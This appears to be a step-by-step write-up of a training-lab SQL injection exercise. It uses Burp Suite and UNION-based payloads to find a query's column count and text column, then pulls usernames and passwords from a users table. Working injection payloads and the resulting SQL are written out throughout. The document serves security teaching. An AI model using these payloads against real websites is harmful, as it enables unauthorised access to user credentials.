## Objective

Goal is to:

1. Determine the number of columns returned by the original query.
2. Identify which column accepts text data.
3. Retrieve both the username and password from the `users` table by concatenating them into a single text value.

---

# Step 1: Intercept the Request

1. Open **Burp Suite**.
2. Turn **Intercept ON**.
3. Browse to the vulnerable lab.
4. Click any product category.
5. Burp captures a request similar to:

```
GET /filter?category=Pets HTTP/2
Host: lab-id.web-security-academy.net
```

Send the request to **Repeater** (`Ctrl + R`).

---

# Step 2: Determine the Number of Columns and Identify the Text Column

Use the following payload:

```sql
'+UNION+SELECT+NULL,'abc'--
```

The SQL executed becomes similar to:

```sql
SELECT name, price
FROM products
WHERE category='Pets'

UNION

SELECT
NULL,
'abc'
```

### Explanation

The original query returns **2 columns**.

| Column | Data Type (Example) |
| --- | --- |
| Column 1 | Integer |
| Column 2 | Text |

The injected query returns:

| Column | Value |
| --- | --- |
| Column 1 | NULL |
| Column 2 | 'abc' |

If the page displays **abc**, you have confirmed:

- The query returns **2 columns**.
- Only the **second column** accepts text.
- `NULL` is used as a placeholder for the first column.

---

# Step 3: Retrieve Usernames and Passwords

Since only one column can display text, both values must be combined into a single string.

Use the following payload:

```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

The SQL becomes:

```sql
SELECT name, price
FROM products
WHERE category='Pets'

UNION

SELECT
NULL,
username || '~' || password
FROM users
```

---

# Understanding the Payload

### `UNION`

Combines the results of your injected query with the application's original query.

---

### `NULL`

Fills the first column because it does not display text.

---

### `username`

Retrieves the username from each row of the `users` table.

Example:

```
administrator
```

---

### `||`

In Oracle and PostgreSQL,

```sql
||
```

is the **string concatenation operator**.

It joins multiple strings together.

Example:

```sql
'Hello' || 'World'
```

Result:

```
HelloWorld
```

---

### `'~'`

The tilde (`~`) is simply a separator.

Without a separator:

```
administratorsecret123
```

It would be difficult to tell where the username ends and the password begins.

With the separator:

```
administrator~secret123
```

The two values are clearly separated.

---

### `password`

Retrieves the password from each user record.

Example:

```
secret123
```

---

### Combined Result

Suppose the `users` table contains:

| username | password |
| --- | --- |
| administrator | secret123 |
| carlos | football |
| peter | qwerty |

The expression:

```sql
username || '~' || password
```

produces:

Result

---

administrator~secret123

---

carlos~football

---

peter~qwerty

---

---

# Why Concatenate?

Imagine the original query returns:

| Column | Type |
| --- | --- |
| 1 | Integer |
| 2 | Text |

If you try:

```sql
UNION SELECT username,password FROM users
```

the database attempts to place:

| Injected Column | Value |
| --- | --- |
| Column 1 | username (text) |
| Column 2 | password (text) |

Since Column 1 expects a numeric value, a data type mismatch may occur.

Instead:

```sql
UNION SELECT NULL,username||'~'||password
```

returns:

| Column | Value |
| --- | --- |
| 1 | NULL |
| 2 | administrator~secret123 |

This matches the original query's structure and data types.
